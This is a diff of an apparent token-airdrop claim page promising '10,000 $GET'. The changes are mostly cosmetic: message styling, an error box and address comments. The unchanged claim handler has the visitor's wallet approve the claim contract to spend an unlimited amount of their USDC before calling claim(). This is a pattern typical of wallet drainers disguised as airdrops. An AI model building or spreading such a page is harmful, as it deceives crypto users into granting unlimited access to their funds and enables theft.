@@ -96,30 +96,24 @@
       margin-bottom: 1.5rem;
       word-break: break-word;
     }
-    .eligibility-msg, .success-msg {
+    .eligibility-msg {
       background: rgba(255 255 255 / 0.1);
       border-radius: 12px;
       padding: 1rem 1.5rem;
-      color: #fff;
       font-size: 1rem;
       box-shadow: 0 0 12px rgba(255, 170, 51, 0.25);
       margin-bottom: 1rem;
+      transition: all 0.3s ease;
     }
-
-    .success-msg {
-      background: rgba(0, 255, 150, 0.12);
+    .success {
+      background-color: rgba(0, 255, 150, 0.1);
       border: 1px solid rgba(0, 255, 150, 0.3);
-      box-shadow: 0 0 10px rgba(0, 255, 150, 0.2);
-      color: #afffda;
+      color: #00ffb3;
     }
-
-    .fade-in {
-      animation: fadeIn 0.6s ease-out forwards;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
+    .error {
+      background-color: rgba(255, 0, 0, 0.1);
+      border: 1px solid rgba(255, 0, 0, 0.3);
+      color: #ff4d4d;
     }
   </style>
 </head>
@@ -137,8 +131,12 @@
       ✅ You are eligible for <strong>10,000 $GET</strong>
     </div>
 
-    <div id="successMessage" class="success-msg" style="display:none;">
-      🎉 You have successfully claimed <strong>10,000 $GET</strong>!
+    <div id="successMessage" class="eligibility-msg success" style="display:none;">
+      🎉 You’ve successfully claimed your <strong>10,000 $GET</strong>!
+    </div>
+
+    <div id="errorMessage" class="eligibility-msg error" style="display:none;">
+      ❌ Claim unsuccessful. Please ensure you're on the correct network and try again.
     </div>
   </div>
 
@@ -149,12 +147,13 @@
     const claimBtn = document.getElementById('claimBtn');
     const eligibilityMsg = document.getElementById('eligibilityMessage');
     const successMsg = document.getElementById('successMessage');
+    const errorMsg = document.getElementById('errorMessage');
 
     let provider, signer;
 
-    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
-    const GET_TOKEN_ADDRESS = "0x8202602770933045BA513a7C6255E34D9B966405";
-    const CLAIM_CONTRACT_ADDRESS = "0x7Bb5c61149a3E66675AFBCA166436CddECF86581";
+    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // BASE USDC
+    const GET_TOKEN_ADDRESS = "0x8202602770933045BA513a7C6255E34D9B966405"; // ✅ Updated GET Token
+    const CLAIM_CONTRACT_ADDRESS = "0x7Bb5c61149a3E66675AFBCA166436CddECF86581"; // ✅ Updated getting.sol
 
     const ERC20_ABI = [
       "function approve(address spender, uint256 amount) external returns (bool)"
@@ -199,6 +198,10 @@
         return;
       }
 
+      // Hide previous messages
+      successMsg.style.display = "none";
+      errorMsg.style.display = "none";
+
       try {
         const usdc = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
         const approvalTx = await usdc.approve(CLAIM_CONTRACT_ADDRESS, ethers.constants.MaxUint256);
@@ -208,13 +211,10 @@
         const claimTx = await claimContract.claim();
         await claimTx.wait();
 
-        successMsg.style.display = 'block';
-        successMsg.classList.add('fade-in');
-        claimBtn.disabled = true;
-        claimBtn.textContent = "Claimed";
+        successMsg.style.display = "block";
       } catch (err) {
         console.error("Claim failed:", err);
-        alert("Transaction failed. Please try again.");
+        errorMsg.style.display = "block";
       }
     });
   </script>
